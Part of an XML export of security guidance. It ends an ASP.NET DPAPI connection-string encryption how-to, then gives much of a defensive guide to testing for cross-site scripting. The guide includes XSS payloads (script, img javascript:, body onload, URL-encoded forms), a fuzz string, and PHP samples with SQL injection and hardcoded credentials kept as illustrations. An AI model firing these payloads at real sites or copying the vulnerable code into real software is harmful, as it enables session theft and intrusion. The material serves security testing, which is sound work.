&amp;lt;CipherValue&amp;gt;AQAAANCMnd8BFdERjHoAwE/Cl&amp;#43;sBAAAAWuizHyLxzk&amp;#43;U4/8NnMRAjQAAAAACAAAAA&lt;br&gt;AADZgAAqAAAABAAAADLFqu00qT0BeGh6wmHHGySAAAAAASAAACgAAAAEAAAAM56z6ezglmufZGcta83RKGgAQAA&lt;br&gt;tvDpExhD6h95lfWBt0FqZYzxupI2IepH/XlhLB5rsuuQDCJUL7XGIIsaVW2oNQxgNCPXxRSuCxHQ7vqgbh4G7xH&lt;br&gt;k0wdyws5Ax4T/RYJbfYEF5KAPzShdmdoZdkY/FOWrVEgAr7LzKFBoDcPJBvgX&amp;#43;lfsJdBNeWRB5BqRX552dUFjtDl&lt;br&gt;p8u3K/dA9twWDU2w/cRLMXJtVZ/y/ICI1fzXjX3u7sY9K1IC&amp;#43;5Hbi7nouCK6Ze5RLBnL0Zfdq0PyGlj2To4ftAYA&lt;br&gt;T0SzkBaxlXRQSzMhX&amp;#43;7c&amp;#43;rgKpMqtG9XjAW26x3IJAp2/uAr2zOZqH&amp;#43;tskamHYSruhTicHJDTtP&amp;#43;r6Rs21y2QkRT9&lt;br&gt;Hb9oPd9B5mDIzGtDkifWBbmwLv4XFuYcna1Zgny7McSxMI62jxayVlZKcS5dXV0shwLoUjbTDcXQmFKsRvo2sCW8&lt;br&gt;6wcN8ad02jhKCQMf9SWnZpd849mlqgMFiQQSFlZ6Q&amp;#43;vJLrXqVb8zmVZemQPQcY/DktgjOvjn0iOZ3zhl20fRENOa&lt;br&gt;3ZIWvvK8p9pblz3sEfS19MAW0JtYUAAAAayvNPot3An7LaCTdFYrEip&amp;#43;fTU4=&amp;lt;/CipherValue&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;/CipherData&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;/EncryptedData&amp;gt;&lt;br&gt;&amp;nbsp; &amp;lt;/connectionStrings&amp;gt;&lt;br&gt;...&lt;/pre&gt;
&lt;/div&gt;
&lt;/li&gt;&lt;li&gt;Add the following Default.aspx Web page to your application's virtual directory, and then browse to this page to verify that encryption and decryption work correctly.
&lt;div&gt;
&lt;pre&gt;&amp;lt;%@ Page Language=&amp;quot;C#&amp;quot; %&amp;gt;&amp;lt;script runat=&amp;quot;server&amp;quot;&amp;gt;&lt;br&gt;&amp;nbsp; protected void Page_Load(object sender, EventArgs e)&lt;br&gt;&amp;nbsp; {&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; Response.Write(&amp;quot;Clear text connection string is: &amp;quot; &amp;#43; &lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ConfigurationManager.ConnectionStrings&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; [&amp;quot;MyLocalSQLServer&amp;quot;].ConnectionString);&lt;br&gt;&amp;nbsp; }&lt;br&gt;&amp;lt;/script&amp;gt;&lt;br&gt;&amp;lt;html&amp;gt;&lt;br&gt;&amp;nbsp; &amp;lt;body/&amp;gt;&lt;br&gt;&amp;lt;/html&amp;gt;  &lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;MyLocalSQLServer is the name of the connection string that you previously specified in the Web.config file.
&lt;/p&gt;
&lt;p&gt;Then, in the Web.config file, you need to enable impersonation as shown in the following example.
&lt;/p&gt;
&lt;div&gt;
&lt;pre&gt;&amp;lt;system.web&amp;gt;&lt;br&gt;&amp;nbsp; ...&lt;br&gt;&amp;nbsp; &amp;lt;identity impersonate=&amp;quot;true&amp;quot; /&amp;gt;&lt;br&gt;&amp;nbsp; ...&lt;br&gt;&amp;lt;/system.web&amp;gt;  &lt;/pre&gt;
&lt;/div&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;If your application runs under a different account than the one used to encrypt the data, ASP.NET will be unable to access the user store where the DPAPI key is held and will generate the following error:
&lt;/p&gt;
&lt;div&gt;
&lt;pre&gt;Failed to decrypt using provider 'MyUserDataProtectionConfigurationProvider'.&lt;br&gt;&amp;nbsp;Error message from the provider: Key not valid for use in specified state. &lt;br&gt;(Exception from HRESULT: 0x8009000B)  &lt;/pre&gt;
&lt;/div&gt;
&lt;/li&gt;&lt;li&gt;To change the &lt;strong&gt;connectionStrings&lt;/strong&gt; section back to clear text, run the following command from the command prompt:
&lt;p&gt;&lt;strong&gt;aspnet_regiis -pd &amp;quot;connectionStrings&amp;quot; -app &amp;quot;/UserDPAPI&amp;quot;&lt;/strong&gt; &lt;/p&gt;
&lt;p&gt;If the command is successful, you will see the following output: &lt;/p&gt;
&lt;div&gt;
&lt;pre&gt;Decrypting configuration section...&lt;br&gt;Succeeded!  &lt;/pre&gt;
&lt;/div&gt;
&lt;/li&gt;&lt;/ol&gt;
&lt;h1&gt;Web Farm Scenarios&lt;/h1&gt;
&lt;p&gt;If you want to deploy the same encrypted configuration file on multiple servers in a Web farm, you should use the
&lt;strong&gt;RSAProtectedConfigurationProvider&lt;/strong&gt;. This provider makes it easy for you encrypt the data on one server computer and then export the RSA private key needed to decrypt the data. You can then deploy the configuration file and the exported key to
 the target servers, and then re-import the keys.&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance.&lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>9529c82f-dbc3-4c73-b1d3-6e47448fa6bc</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>How to Test for Cross-Site Scripting (XSS) Bugs</title>
    <topic>Security</topic>
    <technology> Any</technology>
    <category>Input and Data Validation</category>
    <phase>Implementation</phase>
    <rule_Type>How To</rule_Type>
    <priority>1</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>&lt;br&gt;
&lt;br&gt;
&lt;h1&gt;Applies to&lt;/h1&gt;
&lt;p&gt;XSS bugs affect applications that manipulate HTML input and output.&amp;nbsp; In particular web applications developed in ASP, ASP .NET, PHP, PERL, Java, and Visual Basic.&lt;/p&gt;
&lt;h1&gt;Summary&lt;/h1&gt;
&lt;p&gt;Cross site scripting (or XSS) is a well known HTML-related security vulnerability that commonly affects Internet clients through XSS vulnerable servers.&amp;nbsp; A XSS bug in a web server allows an attacker to send malicious payload to a victim browser such as IE,
 Firefox, or Netscape through the vulnerable server.&amp;nbsp; &amp;nbsp;Payloads may also execute in other HTTP clients not necessarily focused at browsing the web as long as they render HTML and execute any execute scripts.
&lt;/p&gt;
&lt;p&gt;Below is a summary of steps needed for testing for XSS bugs&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Step 1&lt;/strong&gt;:&amp;nbsp; Understand XSS attack scenarios&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Step 2&lt;/strong&gt;:&amp;nbsp; List high risk components&lt;strong&gt; &lt;/strong&gt;and&lt;strong&gt;
&lt;/strong&gt;entry points&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Step 3&lt;/strong&gt;:&amp;nbsp; Start testing and exploring&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Step 4&lt;/strong&gt;:&amp;nbsp; Tune test case data&lt;/li&gt;&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;Step1:&amp;nbsp; Understand XSS Attack Scenarios&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;There are two types of XSS: reflective and persistent.&amp;nbsp; A reflective XSS bug occurs when the web server takes input from a visitor and automatically sends him back the input without checking if the data inputted contains a script.&amp;nbsp; Thus, the input data is
&lt;em&gt;reflected&lt;/em&gt; to the visitor and executes at the visitor's browser.&amp;nbsp;&lt;/p&gt;
&lt;p&gt;A persistent XSS bug is when a script embedded in malicious data is stored in a persistent store such as database, a file, or other storing mechanism.&amp;nbsp; The malicious data containing a script
&lt;em&gt;persists&lt;/em&gt; in the server.&amp;nbsp;&amp;nbsp; If the server application takes this stored content and sends it to the client without validating its contents, the script will be executed in the browser.&amp;nbsp;&lt;/p&gt;
&lt;p&gt;It is important to understand both XSS attack scenarios to know what to look at when testing.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;Reflective XSS through web search form scenario&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;A web site has a search page named search.php that contains the following form:&lt;/p&gt;
&lt;p&gt;&lt;img src="../../../LibrariesImages/72525c65-a233-49df-8821-a45107b7e327/clip_image001.png"&gt;&lt;/p&gt;
&lt;p&gt;&amp;lt;form&amp;gt;&lt;/p&gt;
&lt;p&gt;&amp;lt;input name=&amp;quot;searchInput&amp;quot; type=&amp;quot;text&amp;quot; size=&amp;quot;50&amp;quot;&amp;gt;&lt;/p&gt;
&lt;p&gt;&amp;lt;input name=&amp;quot;searchButton&amp;quot; type=&amp;quot;button&amp;quot; size=&amp;quot;20&amp;quot; value=&amp;quot;search&amp;quot;&amp;gt;&lt;/p&gt;
&lt;p&gt;&amp;lt;/form&amp;gt;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;It collects input using the searchInput variable and shows the results in the same page:&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&amp;lt;p&amp;gt; Search results for &amp;lt;?php echo $_GET['searchInput']?&amp;gt; are:&lt;/p&gt;
&lt;p&gt;&amp;nbsp;The user can type test and will see:&lt;/p&gt;
&lt;p&gt;&lt;img src="../../../LibrariesImages/72525c65-a233-49df-8821-a45107b7e327/clip_image003.png"&gt;&lt;/p&gt;
&lt;p&gt;An attacker can exploit the searchInput variable using the SCRIPT tag and type:&lt;/p&gt;
&lt;p&gt;&lt;img src="../../../LibrariesImages/72525c65-a233-49df-8821-a45107b7e327/clip_image005.png"&gt;&lt;/p&gt;
&lt;p&gt;The server will send the user a page containing a SCRIPT tag and the user browser will execute its contents and display a message box with the word XSS.&amp;nbsp; An attacker can send an email to a victim and tell her to click the following URL:&lt;/p&gt;
&lt;p&gt;http://teammentorexample.com/search/search.php?searchInput=&amp;lt;SCRIPT&amp;gt;payload&amp;lt;/SCRIPT&amp;gt;&lt;/p&gt;
&lt;p&gt;When following the link, the malicious payload executes in the victim browser's context and can be used for stealing session or cookie information.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;Persistent XSS through a SQL database server&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;A web application creates a profile web page by querying a database table and getting profile information from it. The problem is that the database doesn't check for a possible script being stored in the database.&amp;nbsp; To display the user's favorite quote it
 uses the following PHP code:&lt;/p&gt;
&lt;p&gt;echo 'favorite quote:&amp;nbsp; &amp;lt;br&amp;gt;';&lt;/p&gt;
&lt;p&gt;$connection = odbc_connect(&amp;quot;sqldb&amp;quot;, &amp;quot;admin&amp;quot;, &amp;quot;root&amp;quot;);&lt;/p&gt;
&lt;p&gt;$query = &amp;quot;SELECT quote FROM ProfileTable WHERE UserName = &amp;quot; . &amp;nbsp;$_GET['user']&amp;quot;;
&lt;/p&gt;
&lt;p&gt;$result = odbc_exec($connection, $query);&lt;/p&gt;
&lt;p&gt;odbc_fetch_row($result);&lt;/p&gt;
&lt;p&gt;$quote = odbc_result($result, 1); &lt;/p&gt;
&lt;p&gt;print($quote);&lt;/p&gt;
&lt;p&gt;An attacker with a profile name of 'JohnB' connected to the database before and set this information in his profile as his favorite quote:&lt;/p&gt;
&lt;p&gt;&amp;lt;SCRIPT&amp;gt;alert('XSS') &amp;lt;/SCRIPT&amp;gt;&lt;/p&gt;
&lt;p&gt;Now, every time that anyone visits the their profile by following a link like this one will see the alert box:&lt;/p&gt;
&lt;p&gt;&amp;nbsp;http://teammentorexample.com/showProfile.php?user=JohnB&lt;/p&gt;
&lt;p&gt;The attacker can modify the alert box with a more dangerous payload such as stealing session or cookie information.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Step 2: List High Risk Components and Entry Points&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;Identify high risk components&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;The next step in testing for XSS bugs is to do an extensive and careful revision of components that take input data from Internet clients and use send it back to the client.&amp;nbsp; In case of large web services, documentation such as design or architectural, if
 available, become real handy at this point. &amp;nbsp;&amp;nbsp;Testers need to think about what components reflect data to a web client (for reflective XSS) and store data which is later send to a web client (for persistent XSS).&amp;nbsp; Common components that do this include:&amp;nbsp;&lt;/p&gt;
&lt;p&gt;Search web pages&lt;/p&gt;
&lt;p&gt;Profile-related web pages&lt;/p&gt;
&lt;p&gt;Web forums&lt;/p&gt;
&lt;p&gt;Blogs&lt;/p&gt;
&lt;p&gt;RSS feeds&lt;/p&gt;
&lt;p&gt;HTML-based help browsers for thick clients&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;Look for code that writes HTML responses&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;There are many different scripting functions that append HTML to the server response.&amp;nbsp; Finding the server-side code that writes data out is the first step evaluating and finding potential XSS issues.&amp;nbsp; Here are some examples of functions that do that:&lt;/p&gt;
&lt;p&gt;Response.Write&amp;nbsp;&amp;nbsp;&amp;nbsp; (ASP)&lt;/p&gt;
&lt;p&gt;&amp;lt;%= %&amp;gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; (ASP)&lt;/p&gt;
&lt;p&gt;echo&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; (PHP)&lt;/p&gt;
&lt;p&gt;print&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; (PHP)&lt;/p&gt;
&lt;p&gt;Functions to write data to a response vary depending on the language and platform you're testing.&amp;nbsp; Be certain that you understand all the relevant functions in the language you're using.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;Check for non-validated and unencoded data in responses&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Next, check what is being output by the mechanisms above.&amp;nbsp; For example, an application might do this:&lt;/p&gt;
&lt;p&gt;Response.Write(Request.QueryString(search))&lt;/p&gt;
&lt;p&gt;To write the contents of the search value in the URL.&amp;nbsp; If the variable is set to a script it will execute as soon as the client renders the page written.&lt;/p&gt;
&lt;p&gt;The following PHP code doesn't look so harmful at first.&amp;nbsp; &lt;/p&gt;
&lt;p&gt;print($quote);&lt;/p&gt;
&lt;p&gt;However, if the quote variable is a string that directly comes from a database like in the persistent scenario above then it suffers of XSS.&lt;/p&gt;
&lt;p&gt;Look carefully at cases where the output data comes from a back-end though a database or a web method.&amp;nbsp; It might be that a web method returns non-validated data:&lt;/p&gt;
&lt;p&gt;Response.Write(ExternalApplication.GetRSSFeedMethod())&lt;/p&gt;
&lt;p&gt;Even if the data written out by an application comes directly from the user and has not been specifically validated for format, if it is appropriately encoded, it can still be safe.&amp;nbsp; That said, the encoding must take the form of a whitelist of known-safe
 characters (generally only the alphanumerics), not a blacklist as is commonly attempted.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;Match high risk components with entry points&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Non-validated data comes from all of the application's entry points, not just the web.&amp;nbsp; Be certain to cover all the possible sources of malicious data which might get passed to a client.&amp;nbsp; Common data sources include:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Web forms&lt;/li&gt;&lt;li&gt;URL contents&lt;/li&gt;&lt;li&gt;Cookie contents&lt;/li&gt;&lt;li&gt;Flash parameters&lt;/li&gt;&lt;li&gt;SQL database query contents&lt;/li&gt;&lt;li&gt;Web service data&lt;/li&gt;&lt;li&gt;Graphical User Interface&lt;/li&gt;&lt;/ul&gt;
&lt;p&gt;List the high risk variables in the application and their data sources to make sure that they are covered during review and testing&amp;nbsp;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;img src="../../../LibrariesImages/72525c65-a233-49df-8821-a45107b7e327/clip_image007.png"&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Step 3:&amp;nbsp; Start Test and Exploring&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;
&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;During this step testing is focused at submitting basic XSS fuzz strings and observing how the application reacts, and then trying to display a simple alert box that proves the existence of an XSS bug.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;Start with a simple fuzz string&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Success in finding XSS bugs depends on whether the tester is able to store or reflect an HTML script in or through the server.&amp;nbsp; In almost all cases scripts are included in between SCRIPT tags (other tags also worked as explained later).&amp;nbsp; During this step,
 it is recommended to start exploring how the server application's high risk components react to tag related input.&amp;nbsp; A good idea is to start testing a simple fuzz string like this one:&lt;/p&gt;
&lt;p&gt;'&amp;gt;;!--&amp;quot;&amp;gt;&amp;lt;XYZ&amp;gt;&amp;lt;=&amp;amp;{()}&lt;/p&gt;
&lt;p&gt;Then look for the string XYZ in server's response to see how the server processed the special script related characters.&amp;nbsp; It might turn out that the server uses the string inside of a tag:&lt;/p&gt;
&lt;p&gt;&amp;lt;&lt;strong&gt;input&lt;/strong&gt; type=&amp;quot;text&amp;quot; name=&amp;quot;keyword&amp;quot; id=&amp;quot;keyword&amp;quot; maxlength=&amp;quot;255&amp;quot; value=&lt;a name="x_line163"&gt;&lt;/a&gt;&amp;quot;'&amp;gt;;!--&amp;quot;&amp;gt;&amp;lt;&lt;strong&gt;XYZ&lt;/strong&gt;&amp;gt;&amp;lt;=&amp;amp;{()}&amp;quot; style=&amp;quot;height:10px; color:#000;&amp;quot; /&amp;gt;&lt;/p&gt;
&lt;p&gt;Continue by modifying the initial string to try displaying an alert.&amp;nbsp; The double quotes of the original fuzz string closed the
&lt;em&gt;value&lt;/em&gt; property so whatever came before doesn't matter.&amp;nbsp; Also, after the closing parenthesis next to the letter Z the string can be anything.&amp;nbsp; Taking the string can be simplified to this:&lt;/p&gt;
&lt;p&gt;&amp;quot;&amp;gt;&amp;lt;XYZ&amp;gt;&lt;/p&gt;
&lt;p&gt;The server might reply with:&lt;/p&gt;
&lt;p&gt;&amp;lt;&lt;strong&gt;input&lt;/strong&gt; type=&amp;quot;text&amp;quot; name=&amp;quot;keyword&amp;quot; id=&amp;quot;keyword&amp;quot; maxlength=&amp;quot;255&amp;quot; value=&lt;a name="x_line1631"&gt;&lt;/a&gt;&amp;quot;&amp;quot;&amp;gt;&amp;lt;&lt;strong&gt;XYZ&lt;/strong&gt;&amp;gt;&amp;quot; style=&amp;quot;height:10px; color:#000;&amp;quot; /&amp;gt;&lt;/p&gt;
&lt;p&gt;To learn more,&amp;nbsp;see the XSS Cheat Sheet at&amp;nbsp;Ha.ckers.com (&lt;a href="http://ha.ckers.org/xss.html"&gt;http://ha.ckers.org/xss.html&lt;/a&gt;)&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;Try to display an alert box&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;The following goal is to execute a script and the easiest script to test is the one shown in the first scenario that displays an alert box.&amp;nbsp; Note that now the tester knows that the malicious sting needs to start with the &amp;quot;&amp;gt; character, due to where in the
 HTML document it will appear:&lt;/p&gt;
&lt;p&gt;&amp;quot;&amp;gt;&amp;lt;script&amp;gt;alert('Works')&amp;lt;/script&amp;gt;&lt;/p&gt;
&lt;p&gt;If the server doesn't filter the SCRIPT tags then an alert box will appear.&amp;nbsp; The code sent back to the tester will look like this.&lt;/p&gt;
&lt;p&gt;&amp;lt;&lt;strong&gt;input&lt;/strong&gt; type=&amp;quot;text&amp;quot; name=&amp;quot;keyword&amp;quot; id=&amp;quot;keyword&amp;quot; maxlength=&amp;quot;255&amp;quot; value=&lt;a name="x_line16311"&gt;&lt;/a&gt;&amp;quot;&amp;quot;&amp;gt;&lt;span style="text-decoration:underline"&gt;&amp;lt;script&amp;gt;alert('Works')&amp;lt;/script&amp;gt;&lt;/span&gt;&amp;quot; style=&amp;quot;height:10px; color:#000;&amp;quot; /&amp;gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;Cover different tags&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Sometimes severs filter out the string &amp;lt;script&amp;gt; from their output.&amp;nbsp; If the server doesn't allow script tags, try the img tag and put your code in the src property:&lt;/p&gt;
&lt;p&gt;&amp;quot;&amp;gt;&amp;lt;img src=&amp;quot;javascript:alert('Works');&amp;quot;&amp;lt;/img&amp;gt;&lt;/p&gt;
&lt;p&gt;In fact, there are many other tags known to be dangerous in some cases, such as &amp;lt;iframe&amp;gt;, &amp;lt;body&amp;gt;, &amp;lt;embed&amp;gt;, &amp;lt;meta&amp;gt;, &amp;lt;html&amp;gt;, &amp;lt;frame&amp;gt;, &amp;lt;frameset&amp;gt;, &amp;lt;input&amp;gt;, &amp;lt;layer&amp;gt;, &amp;lt;object&amp;gt;, and &amp;lt;style&amp;gt;.
&lt;/p&gt;
&lt;p&gt;A good choice is to try the following that doesn't require script tags or the JavaScript command:&lt;/p&gt;
&lt;p&gt;&amp;quot;&amp;gt;&amp;lt;body onload=alert('Works')&amp;gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Step 4:&amp;nbsp; Tune Test Case Data&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;
&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;During this step testing is focused at covering all entry points and tuning test case data based on the format of the specific entry point.&amp;nbsp;&amp;nbsp;
&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;Consider string format and encoding according to entry point&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;The example in step 3 doesn't specify how the fuzz string was passed to the application (it can be assumed that it was through a web form for these purposes). &amp;nbsp;During this step, testers need to go through their list of components and entry points and modify
 test case data according to the entry point.&amp;nbsp; Make sure that all entry points are covered.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;Web Forms&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Web forms are the easiest to test since they commonly allow only ASCII strings.&amp;nbsp; To test through this entry point, just go through the high risk component list looking for ones that have web forms.&amp;nbsp; Then use a web browser to submit test strings to the components
 via the forms, and possibly an attack proxy like Burp Suite to circumvent any client-side JavaScript used for data validation.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;URL Contents&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;A web application is vulnerable to XSS through the value passed in the password variable:&amp;nbsp;&lt;/p&gt;
&lt;p&gt;http://www.xvulnerablesite.com/login.asp?username=[value]&amp;amp;password=[value]&lt;/p&gt;
&lt;p&gt;If testers want to test the following string in the password value:&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&amp;lt;script&amp;gt;alert('Works')&amp;lt;/script&amp;gt;&lt;/p&gt;
&lt;p&gt;They will need to modify the above URL in this way:&lt;/p&gt;
&lt;p&gt;http://www.xvulnerablesite.com/login.asp?username=any&amp;amp;password=&amp;lt;script&amp;gt;alert('Works')&amp;lt;/script&amp;gt;&lt;/p&gt;
&lt;p&gt;When executing test cases through the URL it is important to try different encodings of the test string.&amp;nbsp;&amp;nbsp; For instance, one can execute the first attack string below and it causes no effect.&amp;nbsp; Then execute the second one and the alert box works.&amp;nbsp; In this
 case the web application didn't allow the symbol characters (except the round brackets) in ASCII but did in their hexadecimal encodings:&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&amp;lt;img src=&amp;quot;javascript:alert('Works');&amp;quot;&amp;gt;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;http://www.xvulnerablesite.com/login.asp?username=any&amp;amp;password=&amp;lt;img%20src%3d%22javascript:alert(%27Works%27)%22&amp;gt;&lt;/p&gt;
&lt;p&gt;When testing through the URL and sometimes in other places, it is necessary to investigate what type of encodings the server is using and modify test cases according to them.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;Cookie contents&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Sometimes the application blindly displays the contents of a cookie in the web browser such as showed in the following PHP code:&lt;/p&gt;
&lt;p&gt;&amp;lt;?php&amp;nbsp; echo $_COOKIE[&amp;quot;testcookie&amp;quot;]; ?&amp;gt;&lt;/p&gt;
&lt;p&gt;To test the risky component through this entry point we have to modify the cookie file in disk and try to inject a simple script:&lt;/p&gt;
&lt;p&gt;&lt;img src="../../../LibrariesImages/72525c65-a233-49df-8821-a45107b7e327/clip_image009.png"&gt;&lt;/p&gt;
&lt;p&gt;Then restart the browser and navigate to the page containing the PHP code to see if an alert box appears.&amp;nbsp; Alternately, an attack proxy can be used to perform this modification on the fly, which is especially helpful in the case of complicated applications.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;Flash Parameters&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Since Flash parameters are frequently passed in the URL, testing Flash parameters is similar to testing URL contents.&amp;nbsp; Here, it is necessary to go through each parameter in the URL and see how the application reacts.&amp;nbsp; Flash also frequently receives parameters
 using &lt;strong&gt;FlashVars&lt;/strong&gt;.&amp;nbsp; Consider the following code to load a Flash movie:&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&amp;lt;object classid=&amp;quot;clsid:D27CDB6E-AE6D-11cf-96B8-444553540000&amp;quot;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;codebase=&amp;quot;&amp;quot;http://macromedia.com/cabs/swflash.cab#version=6,0,0,0&amp;quot;&amp;quot;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;width=&amp;quot;250&amp;quot; height=&amp;quot;250&amp;quot; id=&amp;quot;flaMovie1&amp;quot; align=&amp;quot;center&amp;quot;&amp;gt;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&amp;lt;param name=movie value=&amp;quot;flaMovie1.swf&amp;quot;&amp;gt;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&amp;lt;param name=&lt;strong&gt;FlashVars&lt;/strong&gt; value=&lt;strong&gt;&amp;quot;inputURL=usersinput&amp;quot;&lt;/strong&gt;&amp;gt;
&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&amp;lt;param name=quality value=high&amp;gt; &lt;/p&gt;
&lt;p&gt;&amp;nbsp;&amp;lt;param name=bgcolor value=#ffffff&amp;gt; &lt;/p&gt;
&lt;p&gt;&amp;nbsp;&amp;lt;embed src=&amp;quot;flaMovie1.swf&amp;quot; &lt;strong&gt;FlashVars&lt;/strong&gt;=&lt;strong&gt;&amp;quot;inputURL=usersinput&amp;quot;&lt;/strong&gt;
&lt;/p&gt;
&lt;p&gt;&amp;nbsp; quality=&amp;quot;high&amp;quot; bgcolor=&amp;quot;#ffffff&amp;quot; width=&amp;quot;250&amp;quot; height=&amp;quot;250&amp;quot; &lt;/p&gt;
